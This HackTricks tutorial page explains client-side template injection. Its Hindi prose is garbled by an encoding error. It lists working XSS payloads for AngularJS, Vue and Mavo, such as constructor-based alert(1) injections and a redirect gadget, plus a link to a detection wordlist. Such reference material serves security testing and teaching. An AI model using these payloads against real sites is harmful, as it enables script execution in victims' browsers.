# Client Side Template Injection (CSTI)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## Summary

‡§Ø‡§π [**Server Side Template Injection**](ssti-server-side-template-injection/) ‡§ï‡•Ä ‡§§‡§∞‡§π ‡§π‡•à ‡§≤‡•á‡§ï‡§ø‡§® **client** ‡§Æ‡•á‡§Ç‡•§ **SSTI** ‡§Ü‡§™‡§ï‡•ã **remote server** ‡§™‡§∞ **‡§ï‡•ã‡§°** **execute** ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, **CSTI** ‡§Ü‡§™‡§ï‡•ã **victim's browser** ‡§Æ‡•á‡§Ç **‡§Æ‡§®‡§Æ‡§æ‡§®‡§æ JavaScript** ‡§ï‡•ã‡§° **execute** ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

‡§á‡§∏ ‡§≠‡•á‡§¶‡•ç‡§Ø‡§§‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è **Testing** **SSTI** ‡§ï‡•á ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç ‡§¨‡§π‡•Å‡§§ **similar** ‡§π‡•à, interpreter **‡§è‡§ï template** ‡§ï‡•Ä ‡§Ö‡§™‡•á‡§ï‡•ç‡§∑‡§æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§á‡§∏‡•á execute ‡§ï‡§∞‡•á‡§ó‡§æ‡•§ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§è‡§ï payload ‡§ú‡•à‡§∏‡•á `{{ 7-7 }}` ‡§ï‡•á ‡§∏‡§æ‡§•, ‡§Ø‡§¶‡§ø ‡§ê‡§™ **vulnerable** ‡§π‡•à ‡§§‡•ã ‡§Ü‡§™ `0` ‡§¶‡•á‡§ñ‡•á‡§Ç‡§ó‡•á, ‡§î‡§∞ ‡§Ø‡§¶‡§ø ‡§®‡§π‡•Ä‡§Ç, ‡§§‡•ã ‡§Ü‡§™ ‡§Æ‡•Ç‡§≤ ‡§¶‡•á‡§ñ‡•á‡§Ç‡§ó‡•á: `{{ 7-7 }}`

## AngularJS

AngularJS ‡§è‡§ï ‡§µ‡•ç‡§Ø‡§æ‡§™‡§ï ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§®‡•á ‡§µ‡§æ‡§≤‡§æ JavaScript framework ‡§π‡•à ‡§ú‡•ã HTML ‡§ï‡•á ‡§∏‡§æ‡§• attributes ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§¨‡§æ‡§§‡§ö‡•Ä‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡•á directives ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§ú‡§æ‡§®‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§è‡§ï ‡§â‡§≤‡•ç‡§≤‡•á‡§ñ‡§®‡•Ä‡§Ø **`ng-app`** ‡§π‡•à‡•§ ‡§Ø‡§π directive AngularJS ‡§ï‡•ã HTML ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§ï‡•ã ‡§∏‡§Ç‡§∏‡§æ‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à, ‡§ú‡§ø‡§∏‡§∏‡•á ‡§°‡§¨‡§≤ ‡§ï‡§∞‡•ç‡§≤‡•Ä ‡§¨‡•ç‡§∞‡•á‡§∏‡•á‡§∏ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ JavaScript expressions ‡§ï‡•á execution ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Æ‡§ø‡§≤‡§§‡•Ä ‡§π‡•à‡•§

‡§ê‡§∏‡•á ‡§™‡§∞‡§ø‡§¶‡•É‡§∂‡•ç‡§Ø‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§ú‡§π‡§æ‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§á‡§®‡§™‡•Å‡§ü ‡§ï‡•ã `ng-app` ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ü‡•à‡§ó ‡§ï‡§ø‡§è ‡§ó‡§è HTML body ‡§Æ‡•á‡§Ç ‡§ó‡§§‡§ø‡§∂‡•Ä‡§≤ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§°‡§æ‡§≤‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§Æ‡§®‡§Æ‡§æ‡§®‡§æ JavaScript ‡§ï‡•ã‡§° execute ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§á‡§®‡§™‡•Å‡§ü ‡§ï‡•á ‡§≠‡•Ä‡§§‡§∞ AngularJS ‡§ï‡•Ä syntax ‡§ï‡§æ ‡§≤‡§æ‡§≠ ‡§â‡§†‡§æ‡§ï‡§∞ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§®‡•Ä‡§ö‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§¶‡§ø‡§è ‡§ó‡§è ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§¶‡§ø‡§ñ‡§æ‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§ï‡•à‡§∏‡•á JavaScript ‡§ï‡•ã‡§° execute ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:
```javascript
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
<input ng-focus=$event.view.alert('XSS')>

<!-- Google Research - AngularJS -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```
‡§Ü‡§™ ‡§á‡§∏ **‡§¨‡•Å‡§®‡§ø‡§Ø‡§æ‡§¶‡•Ä ‡§ë‡§®‡§≤‡§æ‡§á‡§® ‡§â‡§¶‡§æ‡§π‡§∞‡§£** ‡§ï‡•ã **AngularJS** ‡§Æ‡•á‡§Ç ‡§á‡§∏ ‡§≤‡§ø‡§Ç‡§ï ‡§™‡§∞ ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç [http://jsfiddle.net/2zs2yv7o/](http://jsfiddle.net/2zs2yv7o/) ‡§î‡§∞ [**Burp Suite Academy**](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression) ‡§Æ‡•á‡§Ç

{% hint style="danger" %}
[**Angular 1.6 ‡§®‡•á ‡§∏‡•à‡§Ç‡§°‡§¨‡•â‡§ï‡•ç‡§∏ ‡§π‡§ü‡§æ ‡§¶‡§ø‡§Ø‡§æ**](http://blog.angularjs.org/2016/09/angular-16-expression-sandbox-removal.html) ‡§á‡§∏‡§≤‡§ø‡§è ‡§á‡§∏ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§∏‡•á ‡§è‡§ï ‡§™‡•á‡§≤‡•ã‡§° ‡§ú‡•à‡§∏‡•á `{{constructor.constructor('alert(1)')()}}` ‡§Ø‡§æ `<input ng-focus=$event.view.alert('XSS')>` ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§
{% endhint %}

## VueJS

‡§Ü‡§™ ‡§è‡§ï **‡§ï‡§Æ‡§ú‡•ã‡§∞ Vue** ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§æ‡§®‡•ç‡§µ‡§Ø‡§® ‡§á‡§∏ ‡§≤‡§ø‡§Ç‡§ï ‡§™‡§∞ ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç [https://vue-client-side-template-injection-example.azu.now.sh/](https://vue-client-side-template-injection-example.azu.now.sh)\
‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§™‡•á‡§≤‡•ã‡§°: [`https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor(%27alert(%22foo%22)%27)()%7D%`](https://vue-client-side-template-injection-example.azu.now.sh/?name=%7B%7Bthis.constructor.constructor\(%27alert\(%22foo%22\)%27\)\(\)%7D%7D)

‡§î‡§∞ ‡§ï‡§Æ‡§ú‡•ã‡§∞ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡§æ **‡§∏‡•ç‡§∞‡•ã‡§§ ‡§ï‡•ã‡§°** ‡§Ø‡§π‡§æ‡§Å ‡§π‡•à: [https://github.com/azu/vue-client-side-template-injection-example](https://github.com/azu/vue-client-side-template-injection-example)
```markup
<!-- Google Research - Vue.js-->
"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\'x1\') ? `` : d.location=`//localhost/mH`')()"> aaa</div>
```
CSTI ‡§™‡§∞ VUE ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§¨‡§π‡•Å‡§§ ‡§Ö‡§ö‡•ç‡§õ‡§æ ‡§™‡•ã‡§∏‡•ç‡§ü [https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets) ‡§™‡§∞ ‡§™‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

### **V3**
```
{{_openBlock.constructor('alert(1)')()}}
```
Credit: [Gareth Heyes, Lewis Ardern & PwnFunction](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)

### **V2**
```
{{constructor.constructor('alert(1)')()}}
```
Credit: [Mario Heiderich](https://twitter.com/cure53berlin)

**‡§Ö‡§ß‡§ø‡§ï VUE ‡§™‡•á‡§≤‡•ã‡§°‡•ç‡§∏ ‡§¶‡•á‡§ñ‡•á‡§Ç** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected)

## Mavo

Payload:
```
[7*7]
[(1,alert)(1)]
<div mv-expressions="{{ }}">{{top.alert(1)}}</div>
[self.alert(1)]
javascript:alert(1)%252f%252f..%252fcss-images
[Omglol mod 1 mod self.alert (1) andlol]
[''=''or self.alert(lol)]
<a data-mv-if='1 or self.alert(1)'>test</a>
<div data-mv-expressions="lolx lolx">lolxself.alert('lol')lolx</div>
<a href=[javascript&':alert(1)']>test</a>
[self.alert(1)mod1]
```
**‡§Ö‡§ß‡§ø‡§ï ‡§™‡•á‡§≤‡•ã‡§°‡•ç‡§∏** [**https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations**](https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations)

## **‡§¨‡•ç‡§∞‡•Ç‡§ü-‡§´‡•ã‡§∞‡•ç‡§∏ ‡§°‡§ø‡§ü‡•á‡§ï‡•ç‡§∂‡§® ‡§≤‡§ø‡§∏‡•ç‡§ü**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}



{% hint style="success" %}
‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§™‡•ç‡§∞‡•à‡§ï‡•ç‡§ü‡§ø‡§∏ ‡§ï‡§∞‡•á‡§Ç AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§™‡•ç‡§∞‡•à‡§ï‡•ç‡§ü‡§ø‡§∏ ‡§ï‡§∞‡•á‡§Ç GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§ì‡§Ç**](https://github.com/sponsors/carlospolop) ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡•á‡§Ç!
* **‡§ú‡•Å‡§°‡§º‡•á‡§Ç** üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ **‡§π‡§Æ‡•á‡§Ç** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ‡§™‡§∞ ‡§´‡•â‡§≤‡•ã ‡§ï‡§∞‡•á‡§Ç‡•§**
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç PRs ‡§ï‡•ã** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ‡§ó‡§ø‡§ü‡§π‡§¨ ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á‡•§

</details>
{% endhint %}
